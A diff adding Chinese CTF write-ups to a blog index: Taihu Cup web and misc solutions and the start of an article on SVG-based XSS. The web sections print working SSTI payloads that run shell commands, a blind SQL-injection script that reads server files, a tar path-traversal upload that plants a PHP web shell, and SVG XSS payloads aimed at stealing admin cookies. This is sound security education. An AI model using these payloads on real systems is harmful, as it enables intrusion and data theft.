@@ -4059,4 +4059,559 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
         <category>web安全</category>
       </categories>
   </entry>
+  <entry>
+    <title>太湖杯</title>
+    <url>/2020/11/14/%E5%A4%AA%E6%B9%96%E6%9D%AF/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复盘一下不久前的太湖杯的web&amp;misc<a id="more"></a></p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="checkInGame"><a href="#checkInGame" class="headerlink" title="checkInGame"></a>checkInGame</h3><p>进去之后是一个连连看的画面，倒计时40秒完成即可获得flag</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201108092621281.png" alt="image-20201108092621281"></p>
+<p>试了几次发现时间完全不够，当然连连看高手除外，正确做法是：</p>
+<p>审查40这个元素打断点，然后把view.js里面那一句删除即可停止时间</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201108092959671.png" alt="image-20201108092959671"></p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201108092913542.png" alt="image-20201108092913542"></p>
+<p>慢慢连完即可得到flag</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201108092601380.png" alt="image-20201108092601380"></p>
+<h3 id="easyWeb"><a href="#easyWeb" class="headerlink" title="easyWeb"></a>easyWeb</h3><p>进入题目界面如下</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107211736799.png" alt="image-20201107211736799"></p>
+<p>随便抓个包发现是python</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107211815382.png" alt="image-20201107211815382"></p>
+<p>知道大概是SSIT，但是过滤了<code>&#123;</code>和<code>&#125;</code>。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107211926347.png" alt="image-20201107211926347"></p>
+<p>在这个网站寻找绕过的Unicode字符，网址如下：<a href="https://www.compart.com/en/unicode/U+FE38">传送门</a>，直接在网址搜索<code>&#123;</code>，就会出现类似的字符，就可以找到<code>︷</code>了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">︷︷config︸︸</span><br></pre></td></tr></table></figure>
+
+<p>成功回显</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107233731092.png" alt="image-20201107233731092"></p>
+<p>接下来直接用常规的ssit的payload打一下即可，然后发现过滤了引号，用request.args绕一下即可。</p>
+<p>payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%EF%B8%B7%EF%B8%B7().__class__.__bases__[0].__subclasses__()[375].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()%EF%B8%B8%EF%B8%B8</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201108093620236.png" alt="image-20201108093620236"></p>
+<p>除了上面的方法之外，还看到有师傅用Unicode字符绕过的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">｛	&amp;#65371;</span><br><span class="line">｝	&amp;#65373;</span><br><span class="line">［	&amp;#65339;</span><br><span class="line">］	&amp;#65341;</span><br><span class="line">＇	&amp;#65287;</span><br><span class="line">＂	&amp;#65282;</span><br></pre></td></tr></table></figure>
+
+<p>payload如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">｛｛url_for.__globals__［＇__builtins__＇］［＇eval＇］（＇__import__（＂os＂）.popen（＂cat &#x2F;flag＂）.read（）＇）｝｝ </span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201109164326501.png" alt="image-20201109164326501"></p>
+<h3 id="CrossFire"><a href="#CrossFire" class="headerlink" title="CrossFire"></a>CrossFire</h3><p>题目有给出两个hint</p>
+<ul>
+<li>存在注入点</li>
+<li>目录穿越</li>
+</ul>
+<p>首先发现有一个id参数可以输入，但是输入1和0的回显不一样。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107221746512.png" alt="image-20201107221746512"></p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107221800783.png" alt="image-20201107221800783"></p>
+<p>测试一下if语句行不行，发现可行，以此为基础写sql盲注脚本。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107221952821.png" alt="image-20201107221952821"></p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107222008777.png" alt="image-20201107222008777"></p>
+<p>用祖传的二分法脚本跑一下，发现可以跑出数据库</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107222255655.png" alt="image-20201107222255655"></p>
+<p>然后可以使用<code>load_file</code>函数去读他的一个源码，读取index.php。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201107233227559.png" alt="image-20201107233227559"></p>
+<p>这里读取的时间有点点久，慢慢等就好了，这里贴一下index.php的源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;&lt;/title&gt;</span><br><span class="line">  &lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span> /&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">  &lt;h1&gt;&lt;/h1&gt;</span><br><span class="line">  &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">   &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;filename:&lt;/label&gt;</span><br><span class="line">   &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">   &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">$upload = <span class="string">&#x27;upload/&#x27;</span>.md5(<span class="string">&quot;shuyu&quot;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir($upload);</span><br><span class="line">file_put_contents($upload.<span class="string">&#x27;/index.html&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">  $allow_type=<span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;bmp&quot;</span>,<span class="string">&quot;tar&quot;</span>,<span class="string">&quot;zip&quot;</span>);</span><br><span class="line">  $fileext = substr(strrchr($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span> &amp;&amp; !in_array($fileext,$type) &amp;&amp; $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">204800</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;upload error&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $filename=addslashes($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    $sql=<span class="string">&quot;insert into img (filename) values (&#x27;<span class="subst">$filename</span>&#x27;)&quot;</span>;</span><br><span class="line">    $conn-&gt;query($sql);</span><br><span class="line">    $sql=<span class="string">&quot;select id from img where filename=&#x27;<span class="subst">$filename</span>&#x27;&quot;</span>;</span><br><span class="line">    $result=$conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">        $id=$row[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],$upload.<span class="string">&#x27;/&#x27;</span>.$filename);</span><br><span class="line">      header(<span class="string">&quot;Location: index.php?id=<span class="subst">$id</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">  $id=addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">  $sql=<span class="string">&quot;select filename from img where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">  $result=$conn-&gt;query($sql);</span><br><span class="line">  <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">      $filename=$row[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    $img=$upload.<span class="string">&#x27;/&#x27;</span>.$filename;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;<span class="subst">$img</span>&#x27;/&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit1&#x27;</span>])) &#123;</span><br><span class="line">  $allow_type=<span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;bmp&quot;</span>,<span class="string">&quot;tar&quot;</span>,<span class="string">&quot;zip&quot;</span>);</span><br><span class="line">  $fileext = substr(strrchr($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span> &amp;&amp; !in_array($fileext,$type) &amp;&amp; $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">204800</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;upload error&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $filename=addslashes($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],$upload.<span class="string">&#x27;/&#x27;</span>.$filename);</span><br><span class="line">    @exec(<span class="string">&quot;cd /tmp&amp;&amp;python3 /tar.py &quot;</span>.escapeshellarg(<span class="string">&#x27;/var/www/html/&#x27;</span>.$upload.<span class="string">&#x27;/&#x27;</span>.$filename));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">      background:url(./back.jpg)  no-repeat right <span class="number">-160</span>px  ;</span><br><span class="line">      background-size:<span class="number">90</span>%;</span><br><span class="line">      background-attachment:fixed;</span><br><span class="line">      background-color: rgba(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.8</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后在index.php里面可以发现在根目录有<code>tar.py</code>，继续读取出来。</p>
+<p><code>tar.py</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import tarfile</span><br><span class="line">import sys</span><br><span class="line">tar &#x3D; tarfile.open(sys.argv[1],&quot;r&quot;)</span><br><span class="line">tar.extractall()</span><br></pre></td></tr></table></figure>
+
+<p>很明显这是个解压文件的代码，根据题目的提示目录穿越。</p>
+<p>在shell.php里面写入一句话木马，然后我们在本地压缩一个tar文件并加上目录穿越的路径。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar cvf kawhi.tar ..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114113110315.png" alt="image-20201114113110315"></p>
+<p>然后上传，在upload目录即可Getshell。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114113155483.png" alt="image-20201114113155483"></p>
+<p>连上蚁剑，最后在根目录下执行/readflag即可</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114112544006.png" alt="image-20201114112544006"></p>
+<p>最后贴一下跑文件内容的脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">pay</span>):</span></span><br><span class="line">	url = <span class="string">&quot;http://122.112.249.228:10080/index.php/?id=1+and+&quot;</span></span><br><span class="line">	result = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30000</span>):</span><br><span class="line">		high = <span class="number">127</span></span><br><span class="line">		low = <span class="number">32</span></span><br><span class="line">		mid = (low + high) / <span class="number">2</span></span><br><span class="line">		<span class="keyword">while</span> high &gt; low:</span><br><span class="line">			payload = <span class="string">&quot;if(ascii(substr(&quot;</span>+pay+<span class="string">&quot;,%d,1))&gt;%d,1,0)%%23&quot;</span>%(i,mid)</span><br><span class="line">			<span class="comment"># print(url+payload)</span></span><br><span class="line">			response = requests.get(url+payload)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> <span class="string">&quot;upload&quot;</span> <span class="keyword">in</span> response.text :</span><br><span class="line">				low = mid + <span class="number">1</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				high = mid</span><br><span class="line"></span><br><span class="line">			mid = (low + high) / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">		result += chr(int(mid))</span><br><span class="line">		print(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pay = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># print(&#x27;database:&#x27;)</span></span><br><span class="line"><span class="comment"># print(exp(pay))</span></span><br><span class="line"><span class="comment"># pay = &#x27;(union select load_file(0x2f6574632f706173737764))&#x27;</span></span><br><span class="line"><span class="comment"># print(&#x27;/etc/passwd:&#x27;)</span></span><br><span class="line"><span class="comment"># print(exp(pay))</span></span><br><span class="line"><span class="comment"># pay = &#x27;(union select load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870))&#x27;</span></span><br><span class="line"><span class="comment"># print(&#x27;/var/www/html/index.php:&#x27;)</span></span><br><span class="line"><span class="comment"># print(exp(pay))</span></span><br><span class="line"><span class="comment"># pay = &#x27;(union select load_file(0x2f7461722e7079))&#x27;</span></span><br><span class="line"><span class="comment"># print(&#x27;/tar.py:&#x27;)</span></span><br><span class="line"><span class="comment"># print(exp(pay))</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ezMd5"><a href="#ezMd5" class="headerlink" title="ezMd5"></a>ezMd5</h3><p>首先F12之后看到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;后宫管理系统登录&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form name=<span class="string">&quot;login&quot;</span> action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        &lt;p&gt;用户名&lt;input type=text name=<span class="string">&quot;name&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;密 码&lt;input type=password name=<span class="string">&quot;password&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span>&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line"> &lt;!-- </span><br><span class="line">$result = @auth($username,$password);</span><br><span class="line"><span class="keyword">if</span> (md5($username) == md5($result)  <span class="keyword">and</span> $result !== $username)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;bingo : &lt;b&gt;<span class="subst">$flag</span>&lt;/b&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>关键提示如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result = @auth($username,$password);</span><br><span class="line"><span class="keyword">if</span> (md5($username) == md5($result)  <span class="keyword">and</span> $result !== $username)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;bingo : &lt;b&gt;<span class="subst">$flag</span>&lt;/b&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要符合这个<code>if</code>的条件就可以打印出flag了</p>
+<p>这里可以给username赋值一个数值md5加密后是0e开头的，然后去爆破password的值，使得result的MD5值和username的MD5相等。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://122.112.253.121:10032/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    password = <span class="string">&#x27;b&#x27;</span> * i + <span class="string">&#x27;QNKCDZO&#x27;</span></span><br><span class="line">    payload = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;240610708&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: password&#125;</span><br><span class="line"></span><br><span class="line">    response = requests.request(<span class="string">&quot;POST&quot;</span>, url, data=payload)</span><br><span class="line">    <span class="keyword">if</span> response.text.find(<span class="string">&#x27;flag&#123;&#x27;</span>) != <span class="number">-1</span>:</span><br><span class="line">        print(response.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114122758555.png" alt="image-20201114122758555"></p>
+<p>虽然可以用这种方法做，但是感觉可能是非预期，但是本次比赛我并没有找到web的官方wp，也就不知道预期解是什么了。</p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h3><p>hint：希尔密码-&gt;rabbit</p>
+<p>首先题目给了一个压缩包：715e25aec2a24ac79ab6e74497cafb80.zip</p>
+<p>直接解压的话会报错文件损坏，拉进010编辑器发现伪加密，把这个地方由09改为00</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114165116000.png" alt="image-20201114165116000"></p>
+<p>然后再解压发现解压出两个文件分别为：<code>fun.zip</code>，<code>omisc.docx</code></p>
+<p>打开<code>omisc.docx</code></p>
+<p>一般来说word文档先考虑下有没有隐藏文字，于是我们在选项中把隐藏文字打开</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114165628922.png" alt="image-20201114165628922"></p>
+<p>然后发现多了如下两行</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114165716474.png" alt="image-20201114165716474"></p>
+<p>发现是希尔加密，在线希尔加密地址：<a href="http://www.atoolbox.net/Tool.php?Id=914">http://www.atoolbox.net/Tool.php?Id=914</a></p>
+<p>解密后发现得到love and peaceee</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114165904666.png" alt="image-20201114165904666"></p>
+<p>然后再用rabbit解密上面那一大段，密钥为love and peaceee</p>
+<p>在线rabbit解密地址：<a href="https://www.sojson.com/encrypt_rabbit.html">https://www.sojson.com/encrypt_rabbit.html</a></p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114170253089.png" alt="image-20201114170253089"></p>
+<p>然后丢进CyberChef，点击小魔法棒，自动识别base32</p>
+<p>CyberChef地址：<a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114170704683.png" alt="image-20201114170704683"></p>
+<p>然后就是很明显的Unicode编码，找个在线解密的试试看</p>
+<p>在线解密Unicode地址：<a href="http://tool.chinaz.com/tools/unicode.aspx">http://tool.chinaz.com/tools/unicode.aspx</a></p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114170852479.png" alt="image-20201114170852479"></p>
+<p>熟悉的佛曰加密，在线解密地址：<a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114172118786.png" alt="image-20201114172118786"></p>
+<p>然后用解密的内容作为密码解压<code>fun.zip</code>，解压后得到fun.wav，拖进<code>Audicty</code>之后</p>
+<p>打开频谱图即可得到flag</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114180815728.png" alt="image-20201114180815728"></p>
+<h3 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h3><p>hint：问windows动态链接库管家吧，他会告诉你answer</p>
+<p>题目给了一个大小差不多是1G的名为dump的文件，老ctfer一看就知道是内存取证了</p>
+<p>首先探测系统版本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f dump imageinfo</span><br></pre></td></tr></table></figure>
+
+<p>最后发现探测图片有一些信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f dump --profile&#x3D;Win7SP0x86 filescan | grep -E &#39;jpg|png|jpeg|bmp|gif&#39;</span><br></pre></td></tr></table></figure>
+
+<p>然后dump下来</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f dump --profile&#x3D;Win7SP0x86 dumpfiles -Q 0x000000003fdf6118 --dump-dir&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114201513903.png" alt="image-20201114201513903"></p>
+<p>打开即可发现flag</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114201746390.png" alt="image-20201114201746390"></p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
+      <categories>
+        <category>CTF比赛</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【转载】浅谈SVG的两个黑魔法</title>
+    <url>/2020/11/06/%E6%B5%85%E8%B0%88SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发合天：<a href="https://www.hetianlab.com/specialized/20201106104206">传送门</a><a id="more"></a></p>
+<p>之前在CTF比赛中遇到了一些关于SVG造成的安全问题，多亏诸多师傅的题目给我的一顿痛打让我又了解了不少新的知识和SVG在WEB安全中的应用，拓展了我的攻击面。</p>
+<h2 id="SVG简介"><a href="#SVG简介" class="headerlink" title="SVG简介"></a>SVG简介</h2><p>SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg/png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。</p>
+<h2 id="SVG造成XSS"><a href="#SVG造成XSS" class="headerlink" title="SVG造成XSS"></a>SVG造成XSS</h2><h3 id="直奔主题"><a href="#直奔主题" class="headerlink" title="直奔主题"></a>直奔主题</h3><p>我们在一张SVG图片里面插入一个JavaScript代码。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">&quot;100&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;50&quot;</span> <span class="attr">r</span>=<span class="string">&quot;40&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;black&quot;</span> <span class="attr">stroke-width</span>=<span class="string">&quot;2&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>我们用浏览器打开它会发现它会造成XSS。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201022085742350.png" alt="image-20201022085742350"></p>
+<h3 id="刨根问底"><a href="#刨根问底" class="headerlink" title="刨根问底"></a>刨根问底</h3><p>为什么这样的SVG图片会造成跨站脚本问题呢？这是因为SVG是支持通过脚本语言来动态访问和修改SVG的任何内容，这点和HTML中的DOM类似，或者说完全一致。因为SVG中的所有标签和属性都已经对应了已经定义的DOM，而这种脚本语言就是<code>JavaScript</code>，所以我们在SVG中插入<code>JavaScript</code>脚本是完全能够被解析的。</p>
+<p>可以看到在国际的SVG标准中定义了script标签的存在，<strong>总之XSS之所以能够执行是因为遵循了svg及xml的标准</strong>。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201102172112942.png" alt="image-20201102172112942"></p>
+<p>那么假设存在一个能够上传SVG的WEB服务器，并且没有对SVG内容进行严格过滤，这就很有可能造成XSS问题。</p>
+<h3 id="CTF中的应用场景"><a href="#CTF中的应用场景" class="headerlink" title="CTF中的应用场景"></a>CTF中的应用场景</h3><p>XSSME</p>
+<p>题目地址：<a href="https://xssrf.hackme.inndy.tw/">https://xssrf.hackme.inndy.tw/</a></p>
+<p>本题是给admin发一封邮件，然后admin会查看你发送的邮件，很明显的xss盗取管理员cookie，但是这里经过fuzz发现过滤了如下字符：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">)</span><br><span class="line">onmouseover</span><br><span class="line">空格onload</span><br><span class="line">空格onerror</span><br><span class="line">&lt;iframe</span><br></pre></td></tr></table></figure>
+
+<p>我们这里可以考虑用SVG来进行XSS，比如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以发送到VPS测试一下是否有效</p>
